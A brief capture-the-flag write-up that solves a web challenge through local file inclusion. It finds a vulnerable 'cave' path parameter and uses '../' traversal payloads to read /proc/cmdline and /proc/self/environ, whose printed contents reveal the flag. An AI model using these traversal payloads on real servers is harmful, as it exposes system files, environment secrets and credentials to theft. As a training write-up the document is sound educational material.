# Writeup

## Solve process 1
The challenge deeply hints that something is wrong with the environment, and begs us to enter an invalid path.

When we enter an invalid path, we see a funky 404 page, specifically one with what looks to be a `/` in it.

## Solve process 2
Start at `robots.txt`

This says to avoid a path, so we enter it, and get sent to the 404 page.

## 404 page:

`cave=adventure/secret_map`

Combined with the hint for environment, this looks like this may be path injection.

Indeed, entering `../../../../../../../../../../proc/cmdline` reveals `initrd=\initrd.img WSL_ROOT_INIT=1 panic=-1 nr_cpus=12 hv_utils.timesync_implicit=1 console=hvc0 debug pty.legacy_count=0`

Changing it to `cave=adventure/../../../../../../../../../../proc/self/environ`, we get the contents of the environment and the flag.

```
HOSTNAME=17ca8307c07fPYTHON_VERSION=3.11.9PWD=/opt/chalDOMAIN=your-domainPYTHON_SETUPTOOLS_VERSION=65.5.1HOME=/home/unprivilegedLANG=C.UTF-8GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696DFLAG=sun{lf1_us1ng_proc_f1les_1s_fUN}SHLVL=0PYTHON_PIP_VERSION=24.0PYTHON_GET_PIP_SHA256=6fb7b781206356f45ad79efbb19322caa6c2a5ad39092d0d44d0fec94117e118PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/66d8a0f637083e2c3ddffc0cb1e65ce126afb856/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

flag: `sun{lf1_us1ng_proc_f1les_1s_fUN}`
